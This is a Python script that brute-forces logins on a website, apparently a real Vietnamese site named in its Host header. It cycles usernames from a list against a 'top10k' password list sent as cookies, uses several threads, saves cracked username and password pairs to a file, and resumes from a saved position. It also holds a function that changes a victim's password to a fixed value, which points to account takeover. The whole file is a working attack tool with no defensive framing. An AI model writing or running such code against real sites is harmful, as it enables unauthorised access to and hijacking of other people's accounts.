from re import search
from urllib.parse import quote_plus
import threading
from requests import get,post
import time
url="https://example.com"

urlchange=''
listPwd=list()
listUser=list()

def save( count):

    with open("countsodu.txt",'w') as f:
        f.write(str(count))



def change(pwd,cookies):
    global urlchange
    data={'oldpassword':pwd,'newpassword':'helo12345678!@#','confirmpassword':'helo12345678!@#'}
    post(urlchange+quote_plus(pwd)+'&newpassword=helo12345678!@#&confirmpassword=helo12345678!@#',data=data,cookies=cookies)

def check(user,   pwd):

    global url
    headers={
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'aztudong.vn',
        'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': "Windows",
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
}
    cookies={'user':user,'pass':pwd}
    x = get(url,cookies=cookies)
    if x.status_code == 500:
        return False
    if search("login = true",x.text)!=None:
        with open('foundsodu.txt','a') as f:
            f.write(user+";"+pwd+"\n")
        return False
    else:
        return True


def restore(fh):
    with open("countsodu.txt", "r") as f:
        d = f.readline()
        print("count: "+d)
    try:
        count=int(d)
    except:
        save(0)
        restore(fh)
    for i in range(count):
        fh.readline()
    return count

def start(listFileUser,listFilePwd,port):
    global listPwd
    global listUser
    with open(listFileUser,'r', encoding="ISO-8859-1") as fh:
        count=restore(fh)
        listUser=fh.readlines()
        f=open(listFilePwd,'r', encoding="ISO-8859-1")
        listPwd=f.readlines()
        f.close()
    for i in range(port) :
        myThread(int(i)+1,int(i) ,port,count).start()



class myThread (threading.Thread):
    def __init__(self, threadID, counter,port,count):
      threading.Thread.__init__(self)
      self.threadID = threadID
      self.counter = counter
      self.port=port
      self.count=count
    def run(self):
        self.print_time(self.threadID, self.counter,self.port,self.count)



    def print_time(self,ID, counter,port,count):
            global listPwd
            global listUser
            length=len(listUser)
            lengthpass= len(listPwd)
            while counter<length-1:
                countpass=0
                user=listUser[counter].strip()
                pwd=listPwd[countpass].strip()
                try:
                    while check(user,pwd)==True:
                        pwd=listPwd[countpass].strip()
                        countpass+=1
                        if countpass >= lengthpass:
                            break
                    counter += port
                except ValueError:
                    print(ValueError)


                if ID!=1 :
                    continue
                with open('countsodu.txt','r',encoding='utf-8') as w:
                    line=int(w.readline())

                if counter+count>line:
                    save(counter+count)
#call
#start('vn-list/list.txt')
start('temp.txt','../top10k_hash.txt',4)
